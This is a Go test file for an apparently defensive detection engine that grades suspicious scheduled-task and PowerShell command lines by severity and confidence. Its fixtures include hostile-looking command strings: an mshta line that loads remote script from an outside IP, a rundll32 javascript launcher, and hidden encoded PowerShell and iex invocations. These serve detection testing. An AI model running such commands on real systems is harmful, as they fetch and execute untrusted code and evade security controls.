package detect

import (
	"strings"
	"testing"
	"tracefall/internal/model"
)

// Authorized policy change: previous no-finding task negatives now retain only
// low/low configuration context. Their stronger target assertions stay intact.
func contextOnlyTaskFindings(fs []model.Finding) bool {
	return len(fs) == 1 && fs[0].Severity == "low" && fs[0].Confidence == "low" && strings.Contains(fs[0].Description, "configuration observation only")
}

func TestInlineTaskActiveCode(t *testing.T) {
	for _, tt := range []struct{ proc, cmd string }{
		{"mshta.exe", `mshta.exe javascript:a=GetObject("script:https://203.0.113.8/a")`},
		{"mshta.exe", `mshta.exe vbscript:Execute("x")(window.close)`},
		{"rundll32.exe", `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write()`},
	} {
		fs := (newScheduledTask{}).Evaluate([]model.Event{taskEvent("e", "Inline", "", tt.cmd, tt.proc)})
		if len(fs) != 1 || fs[0].Severity != "medium" || fs[0].Confidence != "medium" || !strings.Contains(fs[0].Description, "inline active-code") {
			t.Fatal("supported inline active-code lead not selected independently of fallback")
		}
	}
}

func TestTaskCommandPositionWritableScript(t *testing.T) {
	for _, tt := range []struct{ proc, cmd string }{
		{"cmd.exe", `cmd.exe /c C:\Users\alice\AppData\Local\Temp\a.bat`},
		{"cmd.exe", `cmd.exe /c ""C:\Users\alice\AppData\Local\Temp\a.bat" argument"`},
		{"powershell.exe", `powershell.exe -Command C:\Users\alice\AppData\Local\Temp\a.ps1`},
		{"powershell.exe", `powershell.exe -c "& 'C:\Users\alice\AppData\Local\Temp\a.ps1'"`},
	} {
		fs := (newScheduledTask{}).Evaluate([]model.Event{taskEvent("e", "Writable", "", tt.cmd, tt.proc)})
		if len(fs) != 1 || fs[0].Severity != "medium" || fs[0].Confidence != "low" || !strings.Contains(fs[0].Description, "user-writable action target") {
			t.Fatal("supported command-position script lost")
		}
	}
}

func TestScriptNestedHostInvocation(t *testing.T) {
	for _, tt := range []struct{ cmd, sev string }{
		{`powershell.exe -w hidden -enc AAAA`, "high"},
		{`powershell -enc AAAA`, "medium"},
		{`powershell -nop -c iex $s`, "medium"},
		{`Get-Date; powershell.exe -w hidden -enc AAAA`, "high"},
		{"\n\t powershell.exe -w hidden -enc AAAA", "high"},
	} {
		fs := (powershellEncodedCommand{}).Evaluate([]model.Event{{ID: "e", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: tt.cmd}})
		if len(fs) != 1 || fs[0].Severity != tt.sev || fs[0].Confidence != "medium" {
			t.Fatal("nested supported host not selected at calibrated level")
		}
	}
}

func TestConservativeSelfNesting(t *testing.T) {
	e := model.Event{ID: "e", CaseID: "c", EventType: model.EventProcessCreate, ProcessName: "cmd.exe", ParentProcessName: "cmd.exe", CommandLine: `cmd.exe /c echo ok`}
	fs := (suspiciousProcessChain{}).Evaluate([]model.Event{e})
	if len(fs) != 1 || fs[0].Severity != "low" || fs[0].Confidence != "low" {
		t.Fatal("nesting alone must retain low-confidence ancestry lead")
	}
}

func TestHostFlagSupportedSpellings(t *testing.T) {
	for _, cmd := range []string{`C:/Tools/powershell.exe -window hidden -encodedc AAAA`, `powershell.exe -InputFormat:Text -WindowStyle:Hidden -EncodedCommand:AAAA`, `powershell.exe -WindowStyle:Hidden -EncodedCommand:AAAA`, `powershell.exe -ExecutionPol:Bypass -Com:iex $s`} {
		fs := (powershellEncodedCommand{}).Evaluate([]model.Event{{ID: "e", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: cmd}})
		want := "high"
		if strings.Contains(cmd, "ExecutionPol") {
			want = "medium"
		}
		if len(fs) != 1 || fs[0].Severity != want {
			t.Fatal("supported host flag spelling not recognized")
		}
	}
}

func TestUnknownBaselineMatrixRemainsVisible(t *testing.T) {
	for _, cmd := range []string{`powershell.exe -enc`, `powershell.exe -enc -w hidden`, `powershell.exe -InputFormat -w hidden -enc AAAA`, `powershell.exe -Command . $x -enc AAAA`, `powershell.exe -Command $x=FromBase64String($s)`, `powershell.exe -mystery -enc AAAA`} {
		fs := (powershellEncodedCommand{}).Evaluate([]model.Event{{ID: "e", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: cmd}})
		if len(fs) != 1 || fs[0].Severity != "low" || fs[0].Confidence != "low" {
			t.Fatalf("unknown baseline form disappeared or was overstated, count=%d", len(fs))
		}
	}
}

func TestColonFileHostBoundary(t *testing.T) {
	e := taskEvent("e", "File", "", `powershell.exe -File:C:\Temp\a.ps1`, "powershell.exe")
	fs := (newScheduledTask{}).Evaluate([]model.Event{e})
	if len(fs) != 1 || fs[0].Severity != "medium" || fs[0].Confidence != "low" {
		t.Fatal("inline file target missing")
	}
}

func TestPartialUnknownEvidenceKeepsReason(t *testing.T) {
	for _, cmd := range []string{`powershell.exe -nop -unknown -enc AAAA`, `powershell.exe -w -enc AAAA`, `powershell.exe -ExecutionPolicy -enc AAAA`} {
		fs := (powershellEncodedCommand{}).Evaluate([]model.Event{{ID: "e", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: cmd}})
		if len(fs) != 1 || fs[0].Severity != "low" || !strings.Contains(fs[0].Description, "uncertain") {
			t.Fatal("partial known option hid unsupported remainder")
		}
	}
}

func TestUnsupportedLiteralLookingInvocationRetainsLead(t *testing.T) {
	for _, cmd := range []string{`powershell.exe -c "& 'iex' $s"`, "powershell.exe -c \"@'\nIEX $s\n'@\"", "powershell.exe -c \"cmd <#x\niex $s\""} {
		fs := (powershellEncodedCommand{}).Evaluate([]model.Event{{ID: "e", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: cmd}})
		if len(fs) != 1 || fs[0].Severity != "low" || !strings.Contains(fs[0].Description, "uncertain") {
			t.Fatal("unsupported quoted-call/here-string/unclosed-comment was treated as proven data")
		}
	}
}

func TestInlineTaskDataDoesNotBecomePathEvidence(t *testing.T) {
	e := taskEvent("e", "Inline", "", `mshta.exe javascript:alert('C:\Temp\data.txt')`, "mshta.exe")
	fs := (newScheduledTask{}).Evaluate([]model.Event{e})
	if len(fs) != 1 || fs[0].Severity != "medium" || fs[0].Confidence != "medium" || strings.Contains(fs[0].Description, "user-writable action target") {
		t.Fatal("inline literal data corrupted target priority")
	}
}

func TestMissingFileValueRetainsBaselineLead(t *testing.T) {
	fs := (powershellEncodedCommand{}).Evaluate([]model.Event{{ID: "e", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: `powershell.exe -File -enc AAAA`}})
	if len(fs) != 1 || fs[0].Severity != "low" || !strings.Contains(fs[0].Description, "uncertain") {
		t.Fatal("missing file value must not certify following flags as script data")
	}
}

func TestConservativeUnknownBaselineLead(t *testing.T) {
	e := model.Event{ID: "unknown", CaseID: "c", EventType: model.EventProcessCreate, ProcessName: "powershell.exe", CommandLine: `powershell.exe -unrecognized -enc AAAA`}
	fs := (powershellEncodedCommand{}).Evaluate([]model.Event{e})
	if len(fs) != 1 {
		t.Fatalf("unknown baseline-eligible invocation lost: %d", len(fs))
	}
	if fs[0].Severity != "low" || fs[0].Confidence != "low" || !strings.Contains(fs[0].Description, "uncertain") {
		t.Fatal("unknown syntax must remain an explicitly uncertain low-confidence lead")
	}
	task := taskEvent("task", "Routine", "", `tool.exe /check`, "tool.exe")
	fs = (newScheduledTask{}).Evaluate([]model.Event{task})
	if len(fs) != 1 || fs[0].Severity != "low" || fs[0].Confidence != "low" {
		t.Fatal("configuration observation must remain low/low")
	}
}
